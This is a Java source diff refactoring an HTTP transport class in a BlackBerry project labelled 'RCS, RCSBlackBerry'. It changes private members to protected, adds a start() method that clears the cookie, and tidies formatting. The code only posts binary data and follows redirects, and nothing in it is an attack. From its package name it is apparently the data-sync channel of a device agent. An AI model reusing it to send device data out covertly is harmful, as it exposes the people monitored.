@@ -6,7 +6,7 @@
  * 
  * Project      : RCS, RCSBlackBerry
  * *************************************************/
-	
+
 package blackberry.action.sync.transport;
 
 import java.io.IOException;
@@ -30,7 +30,8 @@ public abstract class HttpTransport extends Transport {
     private static final int PORT = 80;
 
     //#ifdef DEBUG
-    private static Debug debug = new Debug("HttpTransport", DebugLevel.INFORMATION);
+    private static Debug debug = new Debug("HttpTransport",
+            DebugLevel.INFORMATION);
     //#endif
 
     String host;
@@ -44,19 +45,23 @@ public abstract class HttpTransport extends Transport {
     }
 
     //private String transportId;
-    private String cookie;
+    protected String cookie;
 
     boolean stop;
     boolean follow_moved = true;
 
-    private final String HEADER_CONTENTTYPE = "content-type";
-    private final String HEADER_SETCOOKIE = "set-cookie";
-    private final String HEADER_CONTENTLEN = "content-length";
+    protected final String HEADER_CONTENTTYPE = "content-type";
+    protected final String HEADER_SETCOOKIE = "set-cookie";
+    protected final String HEADER_CONTENTLEN = "content-length";
 
     //private final String USER_AGENT = "Profile/MIDP-2.0 Configuration/CLDC-1.0";
-    private final String CONTENT_TYPE = "application/octet-stream";
+    protected final String CONTENT_TYPE = "application/octet-stream";
     static//private static String CONTENTTYPE_TEXTHTML = "text/html";
     boolean acceptWifi = false;
+
+    public void start() {
+        cookie = null;
+    }
 
     public void close() {
         cookie = null;
@@ -91,9 +96,7 @@ public abstract class HttpTransport extends Transport {
                             || status == HttpConnection.HTTP_MOVED_PERM || status == HttpConnection.HTTP_TEMP_REDIRECT)) {
                 baseurl = connection.getHeaderField("Location");
                 //#ifdef DEBUG
-                debug
-                        .trace("sendHttpPostRequest Moved to Location: "
-                                + baseurl);
+                debug.trace("sendHttpPostRequest Moved to Location: " + baseurl);
                 //#endif
 
                 connection = createRequest();
@@ -137,7 +140,7 @@ public abstract class HttpTransport extends Transport {
         }
     }
 
-    private HttpConnection createRequest() throws TransportException {
+    protected HttpConnection createRequest() throws TransportException {
 
         String content = "";
 
@@ -175,7 +178,7 @@ public abstract class HttpTransport extends Transport {
         return httpConn;
     }
 
-    private boolean sendHttpPostRequest(HttpConnection httpConn, byte[] data)
+    protected boolean sendHttpPostRequest(HttpConnection httpConn, byte[] data)
             throws TransportException {
         //#ifdef DBC
         Check.requires(data != null, "sendHttpPostRequest: null data");
@@ -186,11 +189,10 @@ public abstract class HttpTransport extends Transport {
 
         // Open the connection and extract the data.
         try {
-
-            OutputStream os = null;
-            os = httpConn.openOutputStream();
+            OutputStream os = httpConn.openOutputStream();
             os.write(data);
             os.close();
+
             //os.flush(); // Optional, getResponseCode will flush
 
             //#ifdef DEBUG
@@ -228,7 +230,7 @@ public abstract class HttpTransport extends Transport {
         return httpOK;
     }
 
-    private byte[] parseHttpConnection(HttpConnection httpConn)
+    protected byte[] parseHttpConnection(HttpConnection httpConn)
             throws TransportException {
         try {
             // Is this html?
